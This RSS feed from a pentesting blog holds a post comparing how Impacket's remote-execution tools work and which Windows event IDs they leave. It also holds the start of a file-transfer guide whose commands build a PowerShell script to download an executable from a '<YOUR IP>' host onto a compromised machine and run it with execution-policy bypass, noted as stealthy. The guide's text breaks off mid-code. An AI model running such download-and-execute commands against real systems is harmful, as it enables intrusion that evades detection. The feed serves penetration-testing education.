<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Pentesting on Ally Petitt</title>
    <link>https://ally-petitt.github.io:443/ally-petitt/en/tags/pentesting/</link>
    <description>Recent content in Pentesting on Ally Petitt</description>
    <generator>Hugo -- 0.125.4</generator>
    <language>en</language>
    <lastBuildDate>Fri, 09 Dec 2022 00:00:00 +0000</lastBuildDate>
    <atom:link href="https://ally-petitt.github.io:443/ally-petitt/en/tags/pentesting/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Windows Remoting: Difference between psexec, wmiexec, atexec, *exec</title>
      <link>https://ally-petitt.github.io:443/ally-petitt/en/posts/2022-12-09_windows-remoting--difference-between-psexec--wmiexec--atexec---exec-bf7d1edb5986/</link>
      <pubDate>Fri, 09 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://ally-petitt.github.io:443/ally-petitt/en/posts/2022-12-09_windows-remoting--difference-between-psexec--wmiexec--atexec---exec-bf7d1edb5986/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*2pekupqLLWtBkgpl&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://images.pexels.com/photos/3760778/pexels-photo-3760778.jpeg?auto=compress&amp;amp;cs=tinysrgb&amp;amp;w=1260&amp;amp;h=750&amp;amp;dpr=1&#34;&gt;https://images.pexels.com/photos/3760778/pexels-photo-3760778.jpeg?auto=compress&amp;amp;cs=tinysrgb&amp;amp;w=1260&amp;amp;h=750&amp;amp;dpr=1&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;If you’re anything like me, you discovered &lt;a href=&#34;https://github.com/SecureAuthCorp/impacket&#34;&gt;Impacket&lt;/a&gt;, either through a course, Ippsec, or your own research, and you look at the scripts. Your grin turns into horror as you realize the sheer amount of scripts that end with “exec”. They all give you remote access but when do you use which one!? Don’t worry, I have your back. Let’s break them down.&lt;/p&gt;
&lt;h1 id=&#34;psexec&#34;&gt;PsExec&lt;/h1&gt;
&lt;p&gt;PsExec works by writing a randomly-named binary to the &lt;code&gt;ADMIN$&lt;/code&gt; SMB share (hence why you require write access to that share in order to use it). The binary establishes a named pipe that is used by the SVCManager to create a new service. This named pipe can be used by the user to execute commands remotely. You can imagine the binary as executing the following command:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sc create [serviceName] binPath&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:\Windows\[uploaded-binary].exe&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;All of your command input and output occurs over the named pipe via SMB (445/TCP).&lt;/p&gt;
&lt;p&gt;As pointed out by &lt;a href=&#34;https://jb05s.github.io/Attacking-Windows-Lateral-Movement-with-Impacket/&#34;&gt;Jeremy Dupuis&lt;/a&gt;, PsExec leaves artifacts behind that require manual cleaning as the binary that is uploaded is not automatically removed. In fact, this is what the error logs look like after he ran a single command on PsExec before exiting.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*Pj8MeQykWNNX4Kr_.png&#34; alt=&#34;Picture of an error log from this article: https://jb05s.github.io/Attacking-Windows-Lateral-Movement-with-Impacket/&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://jb05s.github.io/images/attacking-windows-impacket/psexec-eventlog-sys.png&#34;&gt;https://jb05s.github.io/images/attacking-windows-impacket/psexec-eventlog-sys.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*8jYiFbXMIpkEf-r1.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://jb05s.github.io/images/attacking-windows-impacket/psexec-eventlog-sec.png&#34;&gt;https://jb05s.github.io/images/attacking-windows-impacket/psexec-eventlog-sec.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;As you can see, the logs showed:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1 System Event IDs: 7045 (Service Started)&lt;/li&gt;
&lt;li&gt;12 Security Event IDs: 4672 (Special Privilege Logon), 4624 (Logon), 4634 (Logoff)&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;smbexec--the-next-logicalstep&#34;&gt;SmbExec- the next logical step&lt;/h1&gt;
&lt;p&gt;SmbExec works similarly to PsExec. The main difference is that PsExec will upload a &lt;code&gt;.exe&lt;/code&gt; file to the &lt;code&gt;ADMIN$&lt;/code&gt; share while SmbExec uploads a &lt;code&gt;.bin&lt;/code&gt; file along with a temporary file.&lt;/p&gt;
&lt;p&gt;If you’re interested in learning how to replicate this manually, &lt;a href=&#34;https://book.hacktricks.xyz/windows-hardening/lateral-movement/smbexec#manual-smbexec&#34;&gt;HackTricks&lt;/a&gt; has a section demonstrating how to do so.&lt;/p&gt;
&lt;p&gt;Referencing the images from &lt;a href=&#34;https://jb05s.github.io/Attacking-Windows-Lateral-Movement-with-Impacket/&#34;&gt;Jeremy Dupuis&lt;/a&gt;, we can see the log output for establishing a connection via SmbExec, executing one command, and exiting.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*-KV26ONRuN8dlFWy.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://jb05s.github.io/images/attacking-windows-impacket/smbexec-eventlogs.png&#34;&gt;https://jb05s.github.io/images/attacking-windows-impacket/smbexec-eventlogs.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*MsVaNUTQpbyjLkci.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://jb05s.github.io/images/attacking-windows-impacket/smbexec-eventlogs-sec.png&#34;&gt;https://jb05s.github.io/images/attacking-windows-impacket/smbexec-eventlogs-sec.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The resulting logs are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;4 System Event IDs: 7045 (Service Started), 7009 (Service Error — Timeout)&lt;/li&gt;
&lt;li&gt;3 Security Event IDs: 4672 (Special Privilege Logon), 4624 (Logon), 4634 (Logoff)&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;wmiexec-psexec&#34;&gt;Wmiexec &amp;gt; Psexec?&lt;/h1&gt;
&lt;p&gt;WMIexec works via Windows Management Instrumentation (WMI). WMI works by negotiating a random port (&amp;gt;1024) with the client over an initial connection to RCP (135/TCP). WMI and RPC are commonly used for network administration, so it is common for the ports to be open and unfiltered on an internal network.&lt;/p&gt;
&lt;p&gt;The user sends input to the remote host over the random port. The input is executed with &lt;code&gt;cmd.exe&lt;/code&gt; and the output is written to a file in the &lt;code&gt;ADMIN$&lt;/code&gt; SMB share. The filename starts with &lt;code&gt;__&lt;/code&gt;, followed by the timestamp.&lt;/p&gt;
&lt;p&gt;The advantage to this method is that it allows us to execute code without writing on the disk or creating a new system. The result is a lowered chance of detection by Windows Security Essentials and Bit9, for instance.&lt;/p&gt;
&lt;p&gt;In addition, you can utilize WMI for remote access via the program &lt;code&gt;pth-wmis&lt;/code&gt; which comes preinstalled with Kali Linux.&lt;/p&gt;
&lt;p&gt;Again, we can view the log output of a connection, executing a single command, and exiting as demonstrated by &lt;a href=&#34;https://jb05s.github.io/Attacking-Windows-Lateral-Movement-with-Impacket/&#34;&gt;Jeremy Dupuis&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*TzXqdM8qKIHbTsMN.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://jb05s.github.io/images/attacking-windows-impacket/wmiexec-eventlogs.png&#34;&gt;https://jb05s.github.io/images/attacking-windows-impacket/wmiexec-eventlogs.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The result is:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;14 Security Event IDs: 4672 (Special Privilege Logon), 4624 (Logon), 4634 (Logoff)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;If you’re interested in learning more about WmiExec, &lt;a href=&#34;https://www.crowdstrike.com/blog/how-to-detect-and-prevent-impackets-wmiexec/&#34;&gt;this article&lt;/a&gt; goes into detail about how it works on a low level and how it is detected.&lt;/p&gt;
&lt;h1 id=&#34;atexec&#34;&gt;AtExec&lt;/h1&gt;
&lt;p&gt;This program works by remotely executing scheduled tasks on a remote target through RCP. It creates a scheduled task via the Task Schedule Service. The task is executed with &lt;code&gt;cmd.exe&lt;/code&gt; and the output of the command (&lt;code&gt;STDERR&lt;/code&gt;and &lt;code&gt;STDERR&lt;/code&gt;) is written in a temporary file in the &lt;code&gt;ADMIN$&lt;/code&gt; SMB share. AtExec retrieves the value of this file before deleting it.&lt;/p&gt;
&lt;h1 id=&#34;dcomexec&#34;&gt;DcomExec&lt;/h1&gt;
&lt;p&gt;This program uses the &lt;a href=&#34;https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0&#34;&gt;Distributed Component Object Model (DCOM)&lt;/a&gt; protocol. DCOM is a protocol that relies heavily on RPC to help software components communicate on networked computers. It has the same user interface as PsExec, and works as explained &lt;a href=&#34;https://kylemistele.medium.com/impacket-deep-dives-vol-1-command-execution-abb0144a351d&#34;&gt;here&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Dcomexec uses the MMC20 Application (which is accessible over the network with authentication) and its &lt;code&gt;ExecuteShellCommand&lt;/code&gt; method to execute arbitrary commands. It also supports using the ShellWindows application and the ShellBrowserWindow applications.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;tldr&#34;&gt;TLDR;&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;PsExec works over SMB by uploading a &lt;code&gt;.exe&lt;/code&gt; file that creates a named pipe between you and the remote host&lt;/li&gt;
&lt;li&gt;SmbExec works similarly, except instead of a &lt;code&gt;.exe&lt;/code&gt; file, it uses a &lt;code&gt;.bin&lt;/code&gt; file.&lt;/li&gt;
&lt;li&gt;WmiExec uses the Windows Management Instrumentation service to sent input to the host and output is written to a file in SMB.&lt;/li&gt;
&lt;li&gt;AtExec works through executing scheduled tasks in SMB&lt;/li&gt;
&lt;li&gt;DcomExec uses the DCOM protocol with RPC to execute commands&lt;/li&gt;
&lt;li&gt;They all look different in logs&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I hope you learned something because I certainly did.&lt;/p&gt;
&lt;h1 id=&#34;references&#34;&gt;&lt;strong&gt;References&lt;/strong&gt;&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://jb05s.github.io/Attacking-Windows-Lateral-Movement-with-Impacket/&#34;&gt;Attacking Windows: Performing Lateral Movement with Impacket&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.trustedsec.com/blog/no_psexec_needed/&#34;&gt;https://www.trustedsec.com/blog/no_psexec_needed/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://book.hacktricks.xyz/windows-hardening/lateral-movement/smbexec#manual-smbexec&#34;&gt;https://book.hacktricks.xyz/windows-hardening/lateral-movement/smbexec&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.crowdstrike.com/blog/how-to-detect-and-prevent-impackets-wmiexec/&#34;&gt;https://www.crowdstrike.com/blog/how-to-detect-and-prevent-impackets-wmiexec/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://kylemistele.medium.com/impacket-deep-dives-vol-1-command-execution-abb0144a351d&#34;&gt;https://kylemistele.medium.com/impacket-deep-dives-vol-1-command-execution-abb0144a351d&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;other-exec-tools-that-you-can-learn-moreabout&#34;&gt;Other “exec” tools that you can learn more about&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/skorov/scexec&#34;&gt;ScExec&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec&#34;&gt;MsiExec&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
      <content:encoded><![CDATA[<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*2pekupqLLWtBkgpl" alt=""  />

<em><a href="https://images.pexels.com/photos/3760778/pexels-photo-3760778.jpeg?auto=compress&amp;cs=tinysrgb&amp;w=1260&amp;h=750&amp;dpr=1">https://images.pexels.com/photos/3760778/pexels-photo-3760778.jpeg?auto=compress&amp;cs=tinysrgb&amp;w=1260&amp;h=750&amp;dpr=1</a></em></p>
<p>If you’re anything like me, you discovered <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a>, either through a course, Ippsec, or your own research, and you look at the scripts. Your grin turns into horror as you realize the sheer amount of scripts that end with “exec”. They all give you remote access but when do you use which one!? Don’t worry, I have your back. Let’s break them down.</p>
<h1 id="psexec">PsExec</h1>
<p>PsExec works by writing a randomly-named binary to the <code>ADMIN$</code> SMB share (hence why you require write access to that share in order to use it). The binary establishes a named pipe that is used by the SVCManager to create a new service. This named pipe can be used by the user to execute commands remotely. You can imagine the binary as executing the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>sc create [serviceName] binPath<span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;C:\Windows\[uploaded-binary].exe&#34;</span>
</span></span></code></pre></div><p>All of your command input and output occurs over the named pipe via SMB (445/TCP).</p>
<p>As pointed out by <a href="https://jb05s.github.io/Attacking-Windows-Lateral-Movement-with-Impacket/">Jeremy Dupuis</a>, PsExec leaves artifacts behind that require manual cleaning as the binary that is uploaded is not automatically removed. In fact, this is what the error logs look like after he ran a single command on PsExec before exiting.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*Pj8MeQykWNNX4Kr_.png" alt="Picture of an error log from this article: https://jb05s.github.io/Attacking-Windows-Lateral-Movement-with-Impacket/"  />

<em><a href="https://jb05s.github.io/images/attacking-windows-impacket/psexec-eventlog-sys.png">https://jb05s.github.io/images/attacking-windows-impacket/psexec-eventlog-sys.png</a></em></p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*8jYiFbXMIpkEf-r1.png" alt=""  />

<em><a href="https://jb05s.github.io/images/attacking-windows-impacket/psexec-eventlog-sec.png">https://jb05s.github.io/images/attacking-windows-impacket/psexec-eventlog-sec.png</a></em></p>
<p>As you can see, the logs showed:</p>
<ul>
<li>1 System Event IDs: 7045 (Service Started)</li>
<li>12 Security Event IDs: 4672 (Special Privilege Logon), 4624 (Logon), 4634 (Logoff)</li>
</ul>
<h1 id="smbexec--the-next-logicalstep">SmbExec- the next logical step</h1>
<p>SmbExec works similarly to PsExec. The main difference is that PsExec will upload a <code>.exe</code> file to the <code>ADMIN$</code> share while SmbExec uploads a <code>.bin</code> file along with a temporary file.</p>
<p>If you’re interested in learning how to replicate this manually, <a href="https://book.hacktricks.xyz/windows-hardening/lateral-movement/smbexec#manual-smbexec">HackTricks</a> has a section demonstrating how to do so.</p>
<p>Referencing the images from <a href="https://jb05s.github.io/Attacking-Windows-Lateral-Movement-with-Impacket/">Jeremy Dupuis</a>, we can see the log output for establishing a connection via SmbExec, executing one command, and exiting.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*-KV26ONRuN8dlFWy.png" alt=""  />

<em><a href="https://jb05s.github.io/images/attacking-windows-impacket/smbexec-eventlogs.png">https://jb05s.github.io/images/attacking-windows-impacket/smbexec-eventlogs.png</a></em></p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*MsVaNUTQpbyjLkci.png" alt=""  />

<em><a href="https://jb05s.github.io/images/attacking-windows-impacket/smbexec-eventlogs-sec.png">https://jb05s.github.io/images/attacking-windows-impacket/smbexec-eventlogs-sec.png</a></em></p>
<p>The resulting logs are:</p>
<ul>
<li>4 System Event IDs: 7045 (Service Started), 7009 (Service Error — Timeout)</li>
<li>3 Security Event IDs: 4672 (Special Privilege Logon), 4624 (Logon), 4634 (Logoff)</li>
</ul>
<h1 id="wmiexec-psexec">Wmiexec &gt; Psexec?</h1>
<p>WMIexec works via Windows Management Instrumentation (WMI). WMI works by negotiating a random port (&gt;1024) with the client over an initial connection to RCP (135/TCP). WMI and RPC are commonly used for network administration, so it is common for the ports to be open and unfiltered on an internal network.</p>
<p>The user sends input to the remote host over the random port. The input is executed with <code>cmd.exe</code> and the output is written to a file in the <code>ADMIN$</code> SMB share. The filename starts with <code>__</code>, followed by the timestamp.</p>
<p>The advantage to this method is that it allows us to execute code without writing on the disk or creating a new system. The result is a lowered chance of detection by Windows Security Essentials and Bit9, for instance.</p>
<p>In addition, you can utilize WMI for remote access via the program <code>pth-wmis</code> which comes preinstalled with Kali Linux.</p>
<p>Again, we can view the log output of a connection, executing a single command, and exiting as demonstrated by <a href="https://jb05s.github.io/Attacking-Windows-Lateral-Movement-with-Impacket/">Jeremy Dupuis</a>.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*TzXqdM8qKIHbTsMN.png" alt=""  />

<em><a href="https://jb05s.github.io/images/attacking-windows-impacket/wmiexec-eventlogs.png">https://jb05s.github.io/images/attacking-windows-impacket/wmiexec-eventlogs.png</a></em></p>
<p>The result is:</p>
<ul>
<li>14 Security Event IDs: 4672 (Special Privilege Logon), 4624 (Logon), 4634 (Logoff)</li>
</ul>
<p>If you’re interested in learning more about WmiExec, <a href="https://www.crowdstrike.com/blog/how-to-detect-and-prevent-impackets-wmiexec/">this article</a> goes into detail about how it works on a low level and how it is detected.</p>
<h1 id="atexec">AtExec</h1>
<p>This program works by remotely executing scheduled tasks on a remote target through RCP. It creates a scheduled task via the Task Schedule Service. The task is executed with <code>cmd.exe</code> and the output of the command (<code>STDERR</code>and <code>STDERR</code>) is written in a temporary file in the <code>ADMIN$</code> SMB share. AtExec retrieves the value of this file before deleting it.</p>
<h1 id="dcomexec">DcomExec</h1>
<p>This program uses the <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0">Distributed Component Object Model (DCOM)</a> protocol. DCOM is a protocol that relies heavily on RPC to help software components communicate on networked computers. It has the same user interface as PsExec, and works as explained <a href="https://kylemistele.medium.com/impacket-deep-dives-vol-1-command-execution-abb0144a351d">here</a>:</p>
<blockquote>
<p>Dcomexec uses the MMC20 Application (which is accessible over the network with authentication) and its <code>ExecuteShellCommand</code> method to execute arbitrary commands. It also supports using the ShellWindows application and the ShellBrowserWindow applications.</p>
</blockquote>
<h1 id="tldr">TLDR;</h1>
<ul>
<li>PsExec works over SMB by uploading a <code>.exe</code> file that creates a named pipe between you and the remote host</li>
<li>SmbExec works similarly, except instead of a <code>.exe</code> file, it uses a <code>.bin</code> file.</li>
<li>WmiExec uses the Windows Management Instrumentation service to sent input to the host and output is written to a file in SMB.</li>
<li>AtExec works through executing scheduled tasks in SMB</li>
<li>DcomExec uses the DCOM protocol with RPC to execute commands</li>
<li>They all look different in logs</li>
</ul>
<p>I hope you learned something because I certainly did.</p>
<h1 id="references"><strong>References</strong></h1>
<ul>
<li><a href="https://jb05s.github.io/Attacking-Windows-Lateral-Movement-with-Impacket/">Attacking Windows: Performing Lateral Movement with Impacket</a></li>
<li><a href="https://www.trustedsec.com/blog/no_psexec_needed/">https://www.trustedsec.com/blog/no_psexec_needed/</a></li>
<li><a href="https://book.hacktricks.xyz/windows-hardening/lateral-movement/smbexec#manual-smbexec">https://book.hacktricks.xyz/windows-hardening/lateral-movement/smbexec</a></li>
<li><a href="https://www.crowdstrike.com/blog/how-to-detect-and-prevent-impackets-wmiexec/">https://www.crowdstrike.com/blog/how-to-detect-and-prevent-impackets-wmiexec/</a></li>
<li><a href="https://kylemistele.medium.com/impacket-deep-dives-vol-1-command-execution-abb0144a351d">https://kylemistele.medium.com/impacket-deep-dives-vol-1-command-execution-abb0144a351d</a></li>
</ul>
<h2 id="other-exec-tools-that-you-can-learn-moreabout">Other “exec” tools that you can learn more about</h2>
<ul>
<li><a href="https://github.com/skorov/scexec">ScExec</a></li>
<li><a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec">MsiExec</a></li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>Pentester’s Guide to Performing File Transfers</title>
      <link>https://ally-petitt.github.io:443/ally-petitt/en/posts/2022-06-08_pentester-s-guide-to-performing-file-transfers-3c1a6a38dfc8/</link>
      <pubDate>Wed, 08 Jun 2022 00:00:00 +0000</pubDate>
      <guid>https://ally-petitt.github.io:443/ally-petitt/en/posts/2022-06-08_pentester-s-guide-to-performing-file-transfers-3c1a6a38dfc8/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*HNC0lT4gPMDU8uH0fyjRyw.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;foreword&#34;&gt;Foreword&lt;/h1&gt;
&lt;p&gt;To avoid detection, it is best to use tools that are native to the victim’s computer.&lt;/p&gt;
&lt;h1 id=&#34;ftp-with-windowshost&#34;&gt;FTP with Windows Host&lt;/h1&gt;
&lt;p&gt;While having a shell on the Windows machine, start an FTP server on your host machine. Follow these steps if you don’t already have FTP server installed:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt-get install vsftpd  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo service vsftpd start  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;service vsftpd status #status should be active
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To check if your server is working, type &lt;code&gt;ftp localhost.&lt;/code&gt; If you see the message “Connected to localhost”, your FTP server is running.&lt;/p&gt;
&lt;h2 id=&#34;accessing-file-with-interactive-shell&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*ehYiaPXjraslOYhNqIv7Zw.png&#34; alt=&#34;&#34;  /&gt;

Accessing File With Interactive Shell&lt;/h2&gt;
&lt;p&gt;If you have an interactive shell on the Windows machine, run this command.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cscript wget.vbs http://&amp;lt;YOUR IP&amp;gt;/&amp;lt;PATH TO FILE&amp;gt; &amp;lt;FILENAME TO SAVE AS&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;accessing-file-with-non-interactive-shell&#34;&gt;Accessing File With Non-Interactive Shell&lt;/h2&gt;
&lt;p&gt;If you don’t have an interactive shell, you can’t start PowerShell.exe. A workaround is to create a PowerShell script and execute it:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt;storageDir &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt;pwd &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; wget&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ps1  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt;webclient &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; New&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Object&lt;/span&gt; System&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Net&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;WebClient &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;wget&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ps1  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt;url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://&amp;lt;YOUR IP&amp;gt;/&amp;lt;PATH TO FILE&amp;gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;wget&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ps1  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt;file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;output-file.exe&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;wget&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ps1  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt;webclient&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;DownloadFile(&lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt;url,&lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt;file) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;wget&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ps1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To invoke&lt;code&gt;wget.ps1&lt;/code&gt;, call&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-ExecutionPolicy Bypass -noLogo -NonInteractive --- stealthly
